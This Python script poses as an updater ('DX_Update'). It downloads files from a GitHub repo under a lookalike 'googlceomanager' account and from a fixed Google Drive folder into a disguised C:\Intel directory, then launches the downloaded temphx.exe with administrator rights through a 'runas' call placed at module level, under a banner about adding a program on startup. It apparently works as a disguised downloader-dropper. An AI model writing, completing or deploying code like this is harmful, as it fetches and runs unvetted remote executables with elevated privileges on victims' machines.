import os
import re
import requests




class DX_Update(object):

    # ---------------------------------------------------------------
    # Configuration
    # ---------------------------------------------------------------

    def __init__(self):

        # GitHub source (the img/ folder)
        self.GITHUB_USER = "googlceomanager"
        self.GITHUB_REPO = "elei-esBR"
        self.GITHUB_DIR  = "more/gdrive"
        self.GITHUB_TOKEN = ""  # optional, for private repos / higher rate limits

        # Google Drive source — folder URL provided
        #self.GDRIVE_URL_OR_ID = ""
        self.GDRIVE_URL_OR_ID = "https://drive.google.com/drive/folders/1xHb1M9XRTrieEGqYvVl7XEzFlEaw6Qeg?usp=sharing"

        # Where to save everything.
        # NOTE: "C:\" is a SYNTAX ERROR in Python (the \" escapes the quote),
        #       and r"C:\" is also invalid (raw strings can't end in a backslash).
        #       Use "C:\\" or "C:/" — both are fine on Windows.
        #       Writing to the drive root normally requires Administrator rights,
        #       so a user-writable folder is safer:
        # self.LOCAL_DIR = os.path.join(os.environ.get("USERPROFILE", r"C:\"), "Downloads")
        self.LOCAL_DIR = "C:\\Intel"

    # ---------------------------------------------------------------
    # Helpers
    # ---------------------------------------------------------------

    @staticmethod
    def stream_download(url, local_path, headers=None, chunk_size=8192, max_retries=3):
        """Stream-download a URL to a local file, with retries. Returns True on success."""
        d = os.path.dirname(local_path)
        if d:
            os.makedirs(d, exist_ok=True)

        for attempt in range(1, max_retries + 1):
            try:
                with requests.get(url, headers=headers or {}, stream=True, timeout=60) as r:
                    r.raise_for_status()
                    with open(local_path, "wb") as f:
                        for chunk in r.iter_content(chunk_size=chunk_size):
                            if chunk:
                                f.write(chunk)
                print(f" Saved: {local_path}")
                return True
            except requests.exceptions.RequestException as e:
                print(f"  Attempt {attempt}/{max_retries} failed for {url}: {e}")
                if attempt == max_retries:
                    print(f" Giving up on: {url}")
                    return False
        return False

    # ---------------------------------------------------------------
    # GitHub downloader
    # ---------------------------------------------------------------

    @staticmethod
    def _github_headers(token=""):
        headers = {"Accept": "application/vnd.github.v3+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        return headers

    @classmethod
    def download_github_dir(cls, user, repo, dir_path, out_dir, token="", dest_dir=None):
        """Recursively download all files in a GitHub repo directory. Never raises."""
        api_url = f"https://api.github.com/repos/{user}/{repo}/contents/{dir_path}"
        headers = cls._github_headers(token)

        # Preserve the folder structure instead of flattening to the last segment.
        if dest_dir is None:
            dest_dir = os.path.join(out_dir, os.path.basename(dir_path.rstrip("/")))

        print(f" Listing GitHub dir: {dir_path}")

        try:
            r = requests.get(api_url, headers=headers, timeout=15)
            r.raise_for_status()
            items = r.json()
        except requests.exceptions.RequestException as e:
            print(f" GitHub listing failed ({api_url}): {e}")
            return
        except ValueError as e:
            print(f" GitHub returned invalid JSON: {e}")
            return

        if not isinstance(items, list):
            print(f" Unexpected GitHub response (not a list): {items}")
            return

        os.makedirs(dest_dir, exist_ok=True)

        for item in items:
            try:
                item_type = item.get("type")
                name = item.get("name", "unnamed")

                if item_type == "file":
                    download_url = item.get("download_url")
                    if not download_url:
                        print(f"️  Skipping {name}: no download_url")
                        continue
                    local_path = os.path.join(dest_dir, name)
                    print(f"⬇  GitHub: {name}")
                    # Private-repo download_url also needs auth in some cases
                    dl_headers = {"Authorization": f"token {token}"} if token else None
                    cls.stream_download(download_url, local_path, headers=dl_headers)

                elif item_type == "dir":
                    sub_path = item.get("path")
                    if sub_path:
                        cls.download_github_dir(
                            user, repo, sub_path, out_dir, token,
                            dest_dir=os.path.join(dest_dir, name),
                        )

            except Exception as e:
                # Never let a single file kill the loop
                print(f"  Skipping {item.get('name', '?')}: {e}")

    # ---------------------------------------------------------------
    # Google Drive downloader (via gdown)
    # ---------------------------------------------------------------

    @staticmethod
    def download_google_drive(url_or_id, out_dir):
        """Download a Google Drive file or folder. Never raises."""
        try:
            import gdown
        except ImportError:
            print(" Google Drive support needs `gdown`. Install it with: pip install gdown")
            return

        try:
            os.makedirs(out_dir, exist_ok=True)

            is_folder = "/folders/" in url_or_id
            m = re.search(r"/folders/([a-zA-Z0-9_-]+)", url_or_id) or \
                re.search(r"/file/d/([a-zA-Z0-9_-]+)", url_or_id)
            drive_id = m.group(1) if m else url_or_id.strip()

            if is_folder:
                print(f" Google Drive folder: {drive_id}")
                gdown.download_folder(
                    id=drive_id,
                    output=out_dir,
                    quiet=False,
                    use_cookies=False,
                )
            else:
                print(f"⬇  Google Drive file: {drive_id}")
                gdown.download(
                    id=drive_id,
                    output=os.path.join(out_dir, drive_id),  # give it a real path
                    quiet=False,
                    use_cookies=False,
                )

        except Exception as e:
            print(f" Google Drive download failed: {e}")
            # Uncomment for full stack traces while debugging:
            # traceback.print_exc()

    # ---------------------------------------------------------------
    # Main
    # ---------------------------------------------------------------

    def main(self):
        # 1) GitHub img/ folder — wrapped so any failure won't stop step 2
        if self.GITHUB_USER and self.GITHUB_REPO and self.GITHUB_DIR:
            try:
                self.download_github_dir(
                    self.GITHUB_USER,
                    self.GITHUB_REPO,
                    self.GITHUB_DIR,
                    self.LOCAL_DIR,
                    self.GITHUB_TOKEN,
                )
            except Exception as e:
                print(f" Unexpected error in GitHub step: {e}")
        else:
            print("️  Skipping GitHub (not configured).")

        # 2) Google Drive — same protection
        if self.GDRIVE_URL_OR_ID.strip():
            try:
                self.download_google_drive(
                    self.GDRIVE_URL_OR_ID.strip(),
                    os.path.join(self.LOCAL_DIR, "gdrive"),
                )
            except Exception as e:
                print(f" Unexpected error in Google Drive step: {e}")
        else:
            print("ℹ  Skipping Google Drive (not configured).")

        print(" All downloads finished (errors, if any, were logged above).")






#####################################################################  Add a program on startup ############################################################################







import ctypes
from ctypes import wintypes

def run_elevated(exe_path, params=None, cwd=None):
    ShellExecuteW = ctypes.windll.shell32.ShellExecuteW
    ShellExecuteW.restype = wintypes.HINSTANCE
    ShellExecuteW.argtypes = [
        wintypes.HWND, wintypes.LPCWSTR, wintypes.LPCWSTR,
        wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_int
    ]

    SW_SHOWNORMAL = 1
    result = ShellExecuteW(None, "runas", exe_path, params, cwd, SW_SHOWNORMAL)

    # ShellExecuteW returns a fake HINSTANCE; value <= 32 means error
    if result <= 32:
        raise OSError(f"ShellExecuteW failed, code={result}")
    return result  # note: NOT a PID — no handle to the process

run_elevated(r"C:\Intel\gdrive\temphx.exe", cwd=r"C:\Intel\gdrive")





if __name__ == '__main__':
    DX_Update().main()
